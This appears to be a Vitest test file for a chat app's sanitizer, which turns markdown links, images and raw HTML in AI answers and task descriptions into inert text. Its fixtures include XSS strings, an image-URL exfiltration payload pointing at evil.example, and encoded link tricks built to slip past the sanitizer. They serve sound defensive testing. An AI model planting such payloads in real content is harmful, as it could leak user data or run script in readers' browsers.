import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";

import { MarkdownBody } from "@/components/MarkdownBody";
import type { RefEntry } from "@/lib/exec/agent/types";
import {
  ANSWER_CLIP_MARKER, clipAnswerText, clipUnits, finalizeAnswer, neutralizeLinks, neutralizeTaskText, splitAnswer, stagedTaskText, wellFormedText
} from "@/lib/exec/chat/answer";
import { markersForDisplay, numberSources, stripMarkers, validateMarkers } from "@/lib/exec/chat/markers";

// P5b contract §3.13 (C7-C10, C39, C42): Area C's own edge cases for answer.ts and markers.ts (Area B's
// b-answer-markers.test.ts holds tests 11-15).

const entry = (ref: string): RefEntry => ({ ref, target: { type: "task", id: `t_${ref}` }, source: { system: "dd", id: `t_${ref}`, url: null, label: ref, class: "internal" } });
const registry = (...refs: string[]) => {
  const m = new Map(refs.map((r) => [r, entry(r)]));
  return { citable: (r: string) => m.get(r) ?? null };
};

describe("neutralizeLinks: every link form inert, code left alone (C9)", () => {
  it("nested brackets, images inside links, angle destinations, email autolinks", () => {
    expect(neutralizeLinks("[a [b] c](https://evil.example)")).toBe("a [b] c");
    expect(neutralizeLinks("[![logo](https://evil.example/i.png)](https://evil.example)")).toBe("logo");
    expect(neutralizeLinks("[x](<https://evil.example/a b>)")).toBe("x");
    expect(neutralizeLinks("mail <ann@acme.io> now")).toBe("mail `ann@acme.io` now");
    expect(neutralizeLinks("<javascript:alert(1)>")).toBe("`javascript:alert(1)`");
    expect(neutralizeLinks("[ r3 ](x) and [r4, r5](y)")).toBe("[r3] and r4, r5");
  });

  it("bare URLs are wrapped without their trailing punctuation; code spans and fences are untouched", () => {
    expect(neutralizeLinks("See https://evil.example/x.")).toBe("See `https://evil.example/x`.");
    expect(neutralizeLinks("**https://evil.example**")).toBe("**`https://evil.example`**");
    expect(neutralizeLinks("run `curl https://x.example` now")).toBe("run `curl https://x.example` now");
    const fenced = "Before\n```\ncurl https://x.example <https://y.example>\n```\nafter www.z.example";
    expect(neutralizeLinks(fenced)).toBe("Before\n```\ncurl https://x.example <https://y.example>\n```\nafter `www.z.example`");
    expect(neutralizeLinks("``a ` b`` https://q.example")).toBe("``a ` b`` `https://q.example`");
  });

  it("reference definitions and footnotes go; markers and plain brackets stay", () => {
    expect(neutralizeLinks("Text [r1][r2].\n[r2]: https://evil.example\n  [^1]: note\nEnd")).toBe("Text [r1][r2].\nEnd");
    expect(neutralizeLinks("A list [see above] and (r12)")).toBe("A list [see above] and (r12)");
  });
});

describe("neutralizeTaskText (C42, b-security-1)", () => {
  it("the hostile payload: no image, link, raw tag or unwrapped URL; a title on one line", () => {
    const hostile =
      "Pay ![x](https://evil.example/p.png?d=secret) [click](https://evil.example) <img src=x onerror=alert(1)> see https://evil.example/leak\n" +
      "[ref]: https://evil.example/def\n<!-- hidden --> <script>alert(1)</script> <b>bold</b> trailing <img src=y";
    const description = neutralizeTaskText(hostile, "description");
    for (const bad of ["![", "](", "<img", "<script", "<b>", "<!--", "evil.example/def"]) expect(description).not.toContain(bad);
    expect(description).not.toMatch(/(^|[^`])https?:\/\//);
    expect(description).toContain("`https://evil.example/leak`");
    expect(description).toContain("click");
    const title = neutralizeTaskText("Call Ann\nabout <i>the</i> invoice\r\nnow", "title");
    expect(title).toBe("Call Ann about the invoice now");
    expect(neutralizeTaskText(`a${String.fromCharCode(0x2028)}b`, "title")).toBe("a b");
    expect(neutralizeTaskText("  keep\nlines  ", "description")).toBe("keep\nlines");
  });
});

describe("markers (C7, C8, C39)", () => {
  it("a citable check that throws counts as unknown; groups with spaces normalize; R12 and [r123456] are plain text", () => {
    const out = validateMarkers("[r1 , r2] [R3] [r123456] [r9]", (r) => {
      if (r === "r9") throw new Error("x");
      return true;
    });
    expect(out).toEqual({ text: "[r1][r2] [R3] [r123456] ", cited: ["r1", "r2"], unknown: 1 });
  });

  it("numberSources keeps a cited source the text no longer shows, after the others; display maps groups", () => {
    const s = numberSources([entry("r5"), entry("r1"), entry("r1")], "[r1]", "");
    expect(s.map((x) => [x.n, x.ref])).toEqual([[1, "r1"], [2, "r5"]]);
    expect(markersForDisplay("a [r1, r5] b [r9]", new Map([["r1", 1], ["r5", 2]]))).toBe("a [1][2] b ");
    expect(stripMarkers("x [r1][r2, r3] y")).toBe("x  y");
  });
});

describe("splitAnswer and finalizeAnswer", () => {
  it("the heading needs its own line; CRLF lines split too", () => {
    expect(splitAnswer("We saw Suggested next steps in the doc.")).toEqual({ answer: "We saw Suggested next steps in the doc.", recommendations: "" });
    expect(splitAnswer("A\r\n**Suggested next steps**\r\nB")).toEqual({ answer: "A", recommendations: "B" });
  });

  it("links are neutralized before markers are checked, so a marker link survives as a marker", () => {
    const out = finalizeAnswer("Late [r2](https://evil.example). ![x](https://e.example/p.png)", registry("r2"));
    expect(out).toEqual({ answer: "Late [r2]. x", recommendations: "", cited: [entry("r2")], unknownMarkers: 0 });
  });

  it("a marker cut by the clip is not cited", () => {
    // The cut keeps 40,000 − marker characters: "[r" survives, "1]" doesn't.
    const raw = `${"a".repeat(40_000 - ANSWER_CLIP_MARKER.length - 2)}[r1] ${"b".repeat(100)}`;
    const out = finalizeAnswer(raw, registry("r1"));
    expect(out.answer.length).toBe(40_000);
    expect(out.answer.endsWith(ANSWER_CLIP_MARKER)).toBe(true);
    expect(out.cited).toEqual([]);
  });

  it("clipAnswerText never splits a surrogate pair", () => {
    const face = String.fromCodePoint(0x1f600);
    const s = `${"a".repeat(10)}${face}${"b".repeat(20)}`;
    const cut = clipAnswerText(s, 10 + 1 + ANSWER_CLIP_MARKER.length);
    expect(cut).toBe(`${"a".repeat(10)}${ANSWER_CLIP_MARKER}`);
  });

  it("loop-5: a marker the 60-ref prune joins ('[r61[r62]]' → '[r61]') is removed too; cited ≤ 60 and agrees with the text", () => {
    const refs = Array.from({ length: 62 }, (_v, i) => `r${i + 1}`);
    const raw = `${refs.slice(0, 60).map((r) => `[${r}]`).join(" ")} [r61[r62]] end`;
    const out = finalizeAnswer(raw, registry(...refs));
    expect(out.cited).toHaveLength(60);
    const citedRefs = new Set(out.cited.map((c) => c.ref));
    for (const m of out.answer.matchAll(/\[(r\d+)\]/g)) expect(citedRefs.has(m[1])).toBe(true);
    expect(out.answer).not.toContain("[r61]");
    expect(out.answer.endsWith(" end")).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// security-1 (C9, C42, b-security-1): rendered through DD's MarkdownBody (react-markdown 10 + remark-gfm), the
// neutralized text has no link and no image, whatever the markdown.
// ---------------------------------------------------------------------------

const BS = String.fromCharCode(92);
const render = (md: string) => renderToStaticMarkup(createElement(MarkdownBody, { content: md }));
const hasLinkOrImage = (html: string) => /<a[\s>]|<img[\s>]/i.test(html);

/** The review's seven payloads (security-1), each of which the earlier neutralizer passed through unchanged. */
const REVIEW_PAYLOADS = [
  "See [the report][x] now.\n\n[x]:\n//evil.example/phish",
  "See [the report][x] now.\n\n> [x]: https:evil.example/phish",
  "Look ![logo][p]\n\n[p]:\nhttps:evil.example/pixel.png",
  `See [report][a${BS}]b]\n\n[a${BS}]b]: //evil.example/x`,
  "See [a [b [c]] d](//evil.example/x)",
  "See [doc](//evil.example/((a)))",
  "Reply to bob@evil.example"
];
/** Further forms found while fixing it: escaped and entity-encoded literals, code spans markdown doesn't see, a table. */
const MORE_PAYLOADS = [
  "https&#58;//evil.example/x",
  "www&#46;evil.example",
  "bob&#64;evil.example",
  `https:${BS}//evil.example/x`,
  `www${BS}.evil.example`,
  "- ```\n  ```\n[a [b [c]] d](//evil.example/x)",
  "``` x`\n[a [b [c]] d](//evil.example/x)",
  "`a\n\n[a [b [c]] d](//evil.example/y)\n\nb`",
  "| `a | https://evil.example | b` |\n|---|---|---|\n| c | d | e |",
  `${BS}\`[a [b [c]] d](//evil.example/x)\``,
  "mailto:bob@evil.example and xmpp:bob@evil.example",
  "_www.evil.example and a.www.evil.example",
  "See [^1].\n\n[^1]: a note"
];
/** Removing markup joins a new autolink ("<<b>http:evil.example/x>" → "<http:evil.example/x>"). */
const REFORMED = ["<<b>http:evil.example/x>", "<<b>javascript:alert(1)>"];

describe("security-1: no link or image survives, whatever the markdown", () => {
  it("each payload renders a link or image as it is (the checks below aren't vacuous)", () => {
    for (const p of [...REVIEW_PAYLOADS, ...MORE_PAYLOADS]) expect(hasLinkOrImage(render(p)), p).toBe(true);
  });

  it("a staged task's description (neutralizeTaskText) renders none, and a second pass changes nothing", () => {
    for (const p of [...REVIEW_PAYLOADS, ...MORE_PAYLOADS, ...REFORMED]) {
      const d = neutralizeTaskText(p, "description");
      expect(hasLinkOrImage(render(d)), `${p} → ${d}`).toBe(false);
      expect(neutralizeTaskText(d, "description"), p).toBe(d);
    }
  });

  it("an answer (neutralizeLinks) renders none for the review's payloads", () => {
    for (const p of [...REVIEW_PAYLOADS, ...MORE_PAYLOADS.slice(0, 5), ...REFORMED.map((r) => r.replace("<b>", ""))]) {
      const a = neutralizeLinks(p);
      expect(hasLinkOrImage(render(a)), `${p} → ${a}`).toBe(false);
    }
  });

  it("ordinary text keeps its look: lists, checkboxes, plain brackets, markers, code; a mail address and a URL go in code", () => {
    expect(neutralizeTaskText("- [ ] Call Ann\n- [x] Send the **draft**", "description")).toBe("- [ ] Call Ann\n- [x] Send the **draft**");
    expect(neutralizeTaskText("Email ann@acme.io about https://acme.io/x.", "description")).toBe("Email `ann@acme.io` about `https://acme.io/x`.");
    expect(neutralizeTaskText("password: [hidden] and `npm run build` (twice)", "description")).toBe("password: [hidden] and `npm run build` (twice)");
    expect(neutralizeLinks("Late [r2] and [r3][r4]: done")).toBe(`Late [r2] and [r3][r4${BS}]: done`);
    expect(neutralizeLinks("Q&A for a < b")).toBe(`Q&A for a ${BS}< b`);
    // A title is plain text in DD: no escapes, a mail address left as it is.
    expect(neutralizeTaskText("Reply to ann@acme.io re [a [b [c]] d](//x) a < b", "title")).toBe("Reply to ann@acme.io re [a [b [c]] d](//x) a < b");
  });

  it("an escape the first pass adds can't let the next pass reach further (the result is a fixpoint)", () => {
    for (const p of ["x [a]: `]()`", "[a]:b\n`]()` [c](d)", `[x${BS}](y) [[a](b)](c)`]) {
      const d = neutralizeTaskText(p, "description");
      expect(neutralizeTaskText(d, "description"), p).toBe(d);
      expect(hasLinkOrImage(render(d)), p).toBe(false);
    }
  });

  it("seeded fuzz over markdown-heavy token soup: never a link or image, always a fixpoint (both paths render inert)", () => {
    const TOKENS = [
      "[", "]", "(", ")", "!", "<", ">", "`", "``", "```", "~~~", BS, "&#58;", "&#46;", "&#64;", ":", "//", "https://", "http:", "www.",
      "evil.example", "@", "\n", "\n\n", "> ", "- ", "  ", "    ", "|", "\n|---|---|\n", "*", "_", "x", " ", "[^1]", "]:", "<b>", "-->", "<!--",
      "1. ", "#", "mailto:", "bob", "?", "=", `${BS}[`, `${BS}\``, "]("
    ];
    let seed = 20261107;
    const next = () => {
      seed = (seed * 1664525 + 1013904223) >>> 0;
      return seed / 4294967296;
    };
    for (let n = 0; n < 1500; n += 1) {
      let s = "";
      const len = 3 + Math.floor(next() * 30);
      for (let i = 0; i < len; i += 1) s += TOKENS[Math.floor(next() * TOKENS.length)];
      const d = neutralizeTaskText(s, "description");
      expect(hasLinkOrImage(render(d)), JSON.stringify(s)).toBe(false);
      expect(neutralizeTaskText(d, "description"), JSON.stringify(s)).toBe(d);
      expect(hasLinkOrImage(render(neutralizeLinks(s))), JSON.stringify(s)).toBe(false);
    }
  }, 60_000);
});

describe("clipUnits, wellFormedText and stagedTaskText (loop-1)", () => {
  const face = String.fromCodePoint(0x1f600);
  const isWellFormed = (s: string) => wellFormedText(s) === s;

  it("clipUnits never ends on half a pair; wellFormedText replaces only lone halves", () => {
    const s = `${"a".repeat(499)}${face}b`;
    expect(clipUnits(s, 500)).toBe("a".repeat(499));
    expect(clipUnits(s, 501)).toBe(`${"a".repeat(499)}${face}`);
    expect(clipUnits("abc", 10)).toBe("abc");
    const high = String.fromCharCode(0xd83d);
    const low = String.fromCharCode(0xde00);
    expect(wellFormedText(`x${high}y${low}z${face}`)).toBe(`x${String.fromCharCode(0xfffd)}y${String.fromCharCode(0xfffd)}z${face}`);
    expect(wellFormedText(`ok ${face}`)).toBe(`ok ${face}`);
  });

  it("a description the escapes lengthen past the bound is clipped without a lone surrogate and stays inert", () => {
    // 4 + 3,994 + 2 = 4,000 characters; the escapes add 3, which puts a pair's first half at index 3,999.
    const raw = `a<<<${face.repeat(1997)}zz`;
    const out = stagedTaskText(raw, "description", 4000, (s) => s);
    expect(out.length).toBeLessThanOrEqual(4000);
    expect(isWellFormed(out)).toBe(true);
    const long = stagedTaskText(`${"[a](//e) ".repeat(300)}${"<".repeat(1000)} https://evil.example/x`, "description", 4000, (s) => s);
    expect(long.length).toBeLessThanOrEqual(4000);
    expect(hasLinkOrImage(render(long))).toBe(false);
  });
});
